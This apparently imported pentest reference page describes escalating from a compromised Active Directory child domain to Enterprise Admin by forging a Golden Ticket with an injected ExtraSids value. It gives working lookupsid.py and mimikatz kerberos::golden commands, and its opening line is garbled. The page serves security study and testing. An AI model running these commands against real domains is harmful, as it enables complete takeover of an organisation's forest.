---
title: Child Domain to Forest Compromise - SID Hijacking
type: technique
tags: [active-directory, exploitation, forest, reference-import, sid-hijacking, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Child Domain to Forest Compromise - SID Hijacking

## What it is

Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root.

## How it works

When an attacker compromises a child domain and obtains its `krbtgt` hash, they can forge a Golden Ticket that includes the Enterprise Admins SID (`S-1-5-21-<forest-root>-519`) in the `ExtraSids` field of the PAC. Parent domain controllers accept the ticket because the trust relationship between child and parent domains does not filter `ExtraSids` by default, granting the attacker Enterprise Admin privileges in the forest root. This attack crosses domain boundaries within a forest using only the child domain's krbtgt secret.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

Most trees are linked with dual sided trust relationships to allow for sharing of resources.
By default the first domain created if the Forest Root.

**Requirements**:

- KRBTGT Hash
- Find the SID of the domain

```powershell
$ Convert-NameToSid target.domain.com\krbtgt
S-1-5-21-2941561648-383941485-1389968811-502

# with Impacket
lookupsid.py domain/user:password@10.10.10.10
```

- Replace 502 with 519 to represent Enterprise Admins

**Exploitation**:

- Create golden ticket and attack parent domain.

```powershell
kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
```

## References

- [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[impacket]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
